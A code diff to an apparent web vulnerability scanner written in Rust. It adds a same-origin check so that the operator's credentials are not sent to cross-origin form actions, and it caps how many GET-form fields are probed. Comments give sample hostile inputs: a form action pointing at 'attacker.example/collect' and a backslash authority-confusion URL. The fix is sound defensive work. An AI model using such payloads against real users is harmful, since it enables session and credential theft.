@@ -67,6 +67,43 @@ pub async fn check_form_discovery(
                 continue;
             };
 
+            // Only probe forms that submit back to the scan target's own
+            // origin. The action attribute is attacker-controlled content: it
+            // comes from the scanned page, not from the operator. Probing a
+            // cross-origin action sends every credential the operator
+            // configured — `-H` headers, `--cookies`, and any `Authorization`
+            // or `Cookie` inherited from a raw-http/HAR import, all attached
+            // unconditionally by `apply_headers_ua_cookies_inner` — to a host
+            // the operator never named. A page serving
+            // `<form action="https://attacker.example/collect">` is enough to
+            // collect the operator's session.
+            //
+            // The leak also does not stop at these probes: if the foreign
+            // endpoint echoes the marker back, the fields are recorded as
+            // discovered parameters and the whole scanning phase then aims at
+            // that host, carrying the credentials on every request.
+            //
+            // Comparing the *parsed* origin is what makes this hold against
+            // authority-confusing actions such as
+            // `http://attacker.example\@target.example/submit`: `join` has
+            // already resolved that to host `attacker.example` (correct WHATWG
+            // parsing — a backslash terminates the authority in a special
+            // scheme), so it compares as cross-origin. A textual prefix check
+            // against `target.url` would not survive it.
+            //
+            // The cost is real but accepted, and matches what the blind/stored
+            // path in `scanning::xss_blind` already does: parameters on a form
+            // that legitimately posts to a different host (a separate API or
+            // login host) are not discovered.
+            if !crate::scanning::xss_blind::is_same_origin(&target.url, &form_url) {
+                crate::dbg_log!(
+                    "skipping cross-origin form action {} on {} (credentials are not sent off-origin)",
+                    form_url,
+                    target.url
+                );
+                continue;
+            }
+
             let mut fields: Vec<(String, String)> = Vec::new();
             for input in form.select(input_sel) {
                 let name = input.value().attr("name").unwrap_or("").to_string();
@@ -241,8 +278,13 @@ pub async fn check_form_discovery(
                 }
             }
         } else {
-            // GET form: test each field as query parameter on the form action URL
-            for (field_name, field_value) in &fields {
+            // GET form: test each field as query parameter on the form action URL.
+            // Capped like the POST and multipart branches above: this loop was
+            // the one that was not, so a page serving a GET form with 50 000
+            // inputs bought 50 000 requests (each rebuilding the whole query
+            // string) while the debug log above still claimed only the first
+            // `MAX_FORM_FIELDS` were probed.
+            for (field_name, field_value) in fields.iter().take(MAX_FORM_FIELDS) {
                 let _permit = semaphore.acquire().await.expect("acquire semaphore permit");
                 let mut test_url = form_url.clone();
                 // Build query: set all fields, replace target field with test value
